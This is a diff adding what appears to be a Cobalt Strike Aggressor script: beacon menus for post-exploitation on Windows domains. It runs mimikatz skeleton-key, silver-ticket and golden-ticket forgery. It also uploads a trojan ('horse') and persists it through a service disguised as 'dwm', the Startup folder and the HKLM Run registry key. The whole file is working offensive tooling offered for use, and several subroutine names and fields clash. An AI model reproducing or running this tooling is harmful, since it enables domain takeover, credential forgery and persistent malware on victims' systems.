@@ -1,0 +1,135 @@
+menu "Permission maintenance" {
+item "Skeleton Key"{
+$bid = $1['@'];
+bmimikatz($bid , "misc::skeleton");
+}
+
+item "Silver Ticket" {
+$bid = $1['@'];
+$dialog = dialog("Silver Ticket", %(user => "administrator", domain => "xxxx.com", sid => "sid", target => "dc.xxxx.com", rc4 => "NTLM", service => "cifs", bid => $bid), &SilverTicket);
+dialog_description($dialog, "To generate a silver ticket, the attacker must obtain the target service account's password ntml-hash value.");
+drow_text($dialog, "domain", "Domain name: ");
+drow_text($dialog, "sid", "sid: ");
+drow_text($dialog, "target", "Target host name: ");
+drow_text($dialog, "rc4", "NTLM-hash: ");
+drow_text($dialog, "service", "Fake service: ");
+drow_text($dialog, "user", "Fake user name: ");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+  sub SilverTicket { $user = $3['user']; $domain = $3['domain']; $sid = $3['sid']; $target = $3['target']; $rc4 = $3['rc4']; $service = $3['service']; bmimikatz($bid, "kerberos::golden /domain:$domain /sid:$sid /target:$target /rc4:$rc4 /service:$service /user:$user /ptt exit"); } item "gold note" { $bid = $1['@']; $dialog = dialog("Golden Ticket", %(admin => "administrator", domain => "xxxx.com", sid => "sid", krbtgt => "NTLM", bid => $bid), &GoldenTicket ); dialog_description($dialog, "To generate a golden ticket, the attacker must obtain the ntml-hash value of the krbtgt account.");
+drow_text($dialog, "admin", "Fake username: ");
+drow_text($dialog, "domain", "Domain name: " );
+drow_text($dialog, "sid", "sid: ");
+drow_text($dialog, "krbtgt", "krbtgt NTLM-hash: ");
+dbutton_action($dialog, "Run");
+dialog_show($dialog) ;
+}
+sub GoldenTicket {
+$admin = $3['admin'];
+$domain = $3['domain'];
+$sid = $3['sid'];
+$krbtgt = $3['krbtgt'];
+bmimikatz($bid, "kerberos::golden /admin:$admin /domain:$domain /sid:$sid /krbtgt:$krbtgt /ptt exit");
+}
+
+  menu "Self-start" {
+item "Transfer horse" {
+$bid = $1;
+$dialog = dialog("Upload your horse", %(FileName => "/Users/zjun/Downloads/ma.exe", UploadPath => "C:\\Users\\Public\\", bid => $bid), &upload);
+dialog_description($dialog, "Upload your horse");
+drow_text($dialog, "FileName", "Local path: ");
+drow_text($dialog, "UploadPath", "Upload path: ");
+dbutton_action($dialog, "Upload");
+dialog_show($dialog);
+}
+sub upload {
+bcd($bid, $3['UploadPath']);
+bupload($bid, $3['FileName']);
+}
+menu "Self-start service" {
+item "Create self-start service" {
+$bid = $1['@'];
+$dialog = dialog("Create a self-starting service", %(service => "dwm", program => "C:\\Users\\Public\\ma.exe", bid => $bid), &auto);
+drow_text($dialog, "service", "Create service name: ");
+drow_text($dialog, "program", "Program path: ");
+dialog_description($dialog, "Add service to run automatically.");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub auto {
+$service = $3['service'];
+$program = $3['program'];
+bshell($bid, "sc create $service binPath= $program start= auto");
+}
+item "Delete self-starting service" {
+$bid = $1['@'];
+$dialog = dialog("Delete self-starting service", %(service => "dwm", bid => $bid), &del);
+drow_text($dialog, "service", "Service name: ");
+dialog_description($dialog, "Delete the auto-start service. ");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub del{
+$service = $3['service'];
+bshell($bid, "sc delete $service");
+}
+}
+menu "Startup folder" {
+item "Copy to startup folder" {
+$bid = $1['@'];
+$dialog = dialog("Copy to startup folder", %(program => "C:\\Users\\Public\\ma.exe", user => "administrator", bid => $bid), &auto);
+drow_text($dialog, "program", "Program path: ");
+drow_text($dialog, "user", "User name: ");
+dialog_description($dialog, "Copy to startup folder.");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+      sub auto {
+$program = $3['program'];
+$user = $3['user'];
+bshell($bid, "copy \"$program\" \"C:\\Users\\$user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
+}
+item "Delete the auto-start folder program" {
+$bid = $1['@'];
+$dialog = dialog("Delete the auto-start service", %(program => "dwm", bid => $bid), &del);
+drow_text($dialog, "service", "Service name: ");
+dialog_description($dialog, "Delete the auto-start service.");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub del{
+$service = $3['service'];
+bshell($bid, "sc delete $service");
+}
+}
+menu "Add registry to achieve auto-start" {
+item "Add registry to achieve self-start" {
+$bid = $1['@'];
+$dialog = dialog("Add registry to achieve self-start", %(program => "C:\\Users\\Public\\ma.exe", name =>"start", bid => $bid), &auto);
+drow_text($dialog, "program", "Program path: ");
+drow_text($dialog, "name", "Name: ");
+dialog_description($dialog, "Add registry to achieve self-start.");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub auto {
+$program = $3['program'];
+$name = $3['name'];
+bshell($bid, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"$name\" /d \"$program\" /f");
+}
+item "Delete registry auto-start" {
+$bid = $1['@'];
+$dialog = dialog("Delete registry auto-start", %(name => "start", bid => $bid), &del);
+drow_text($dialog, "name", "Name: ");
+dialog_description($dialog, "Delete registry auto-start.");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub del{
+$name = $3['name'];
+bshell($bid, "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"$name\" /f");
+}
+}
+}
+}
